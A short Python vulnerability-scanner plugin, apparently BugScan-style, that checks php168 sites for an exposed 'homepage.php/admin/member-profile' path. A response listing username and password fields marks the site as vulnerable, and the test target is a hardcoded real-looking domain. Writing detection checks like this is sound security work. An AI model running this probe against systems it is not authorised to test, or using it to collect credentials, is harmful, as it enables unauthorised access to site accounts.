#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = php168 com/homepage.php/admin/member-profile
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-026345

import re 

def assign(service, arg):
    if service == 'php168':
        return True, arg

def audit(arg):
    payload = 'homepage.php/admin/member-profile'
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target)
    if code == 200 and '[username]' in body and '[password]' in body and 'Array' in body:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('php168', 'http://www.aedp.cn/')[1])